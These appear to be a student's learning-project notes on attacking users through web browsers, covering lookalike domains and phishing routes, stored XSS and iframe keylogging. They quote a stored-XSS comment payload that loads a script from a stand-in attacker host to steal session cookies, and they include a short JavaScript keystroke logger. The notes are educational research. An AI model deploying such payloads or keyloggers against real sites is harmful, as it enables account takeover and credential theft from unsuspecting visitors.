### Introduction

This document is a part of a learning project: Attacking Web Browsers

This page is meant to break down found methods for attacking user trough web browser. 
This document is meant to be updated when more methods are being explored.

#### Social engineering angle

Convincing a user to enter a spoofed site, while posing as legitimate. For example registering similar looking domain name (see kela.fi and keia.fi, or using non-ASCII characters).

The attacker can try to impersonate the legitimate website by mimicing the content of the website to try to get the user to for example log into the site.
Possible risk for user include credential or personal information theft. This method can also make it possible to get the user to load a malicious site, even though the user wouldn't perform any actions in the site itself. Methods for exploiting this are to be researched in the project.
Methods for getting the user to use a link for the malicious website:
- link in an another application
  - Email
  - Social media
  - Video conference apps
  - VoIP
- trough search engine or other trusted website
  - comment sections in forums

#### Stored XSS attack idea

If a website has a vulnerability, that allows permanent script embedding or a malicious website allowing this, the attacker could use HTML tag to activate a JavaScrip file hosted in another website.

"For example attacker could add a comment on a site that allows HTML tags to be embedded in a comment section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.
The attacker adds the following comment: Great price for a great item! Read my review here <script src=”http:/ /hackersite.com/authstealer.js”> </script>.
From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.
Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place."

Example found: https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/

#### Keylogger
Stored XXS attack could also be used for iframe keylogger. If you could activate nearly invicible (opacity set to 0.0001) or 0x0 sized iframe on top of legitimate or legitimate looking website, you could get user to type for example usernames and passwords and use JavaScript to record the keypresses. A step further would be to seemingly print the key strokes on the victim web page.

some XXS sources for future:

https://github.com/chentetran/xss-keylogger

https://gist.github.com/JeppeLeth/294f1955d792274839c2

```
var stolen = "";
 document.addEventListener('keydown', logKey);
 function logKey(e) {
   if (e.key != "Meta" && e.key != "Shift" && e.key != "Alt" ) {
     stolen = stolen + e.key;
   }
   document.getElementById('log').innerHTML = stolen;
 }
 ```
 source: https://gracefulsecurity.com/clickjacking-and-javascript-keylogging-in-iframes/
 
 #### Project continuation...
 
 Next step in the project is to scope more methods for attacking the user trough browser. Stored XXS attack seems interesting and possibly to be prototyped. Requirements for this are at least: 
 - creating a script for the purpose
 - hosting a website for the JS
 - hosting an example victim site

